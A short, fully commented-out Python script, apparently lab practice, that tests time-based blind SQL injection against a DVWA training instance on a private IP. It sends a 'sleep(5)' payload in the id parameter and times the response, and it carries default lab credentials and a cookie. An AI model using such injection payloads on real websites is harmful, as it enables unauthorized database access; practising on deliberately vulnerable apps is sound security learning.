# import requests
# from datetime import timedelta
# from timeit import default_timer as timer


# # data = {
# #     "username" : "admin",
# #     "password" : "password"
# # }
# # response = requests.post("http://192.168.229.134/dvwa/login.php", data=data) # login

# cookies = {
#     # "PHPSESSID" : "qoi90njfgqffgaqhulol2te8e4",
#     "security" : "low"
# }

# delay_time_s = 5
# start = timer()
# response = requests.get("http://192.168.229.134/dvwa/vulnerabilities/sqli_blind/?id=1%27+and+sleep%285%29+%23&Submit=Submit#", cookies=cookies)
# # print(response.url)
# end = timer()

# if timedelta(seconds=end - start) >= timedelta(seconds=delay_time_s) :
#     print(response.url)
#     print("Time Based SQLi worked")
# else :
#     print("didn't work")